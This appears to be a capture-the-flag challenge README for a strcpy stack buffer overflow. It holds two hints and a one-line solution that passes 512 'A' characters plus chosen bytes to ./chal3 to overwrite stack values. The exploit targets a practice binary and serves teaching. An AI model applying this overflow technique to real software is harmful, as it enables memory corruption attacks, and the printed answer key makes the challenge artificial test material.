Challenge 3
===========
Simple buffer overflow to overwite values on the stack.

Hints
-----
1. Strcpy is involved. It's awful.
2. There may be more than one thing you need to overwrite

Solution
--------
./chal3 $(python -c 'print "A"*512 + "\xad\xda\xad\xda\xdd\xee\xee\xdd"')
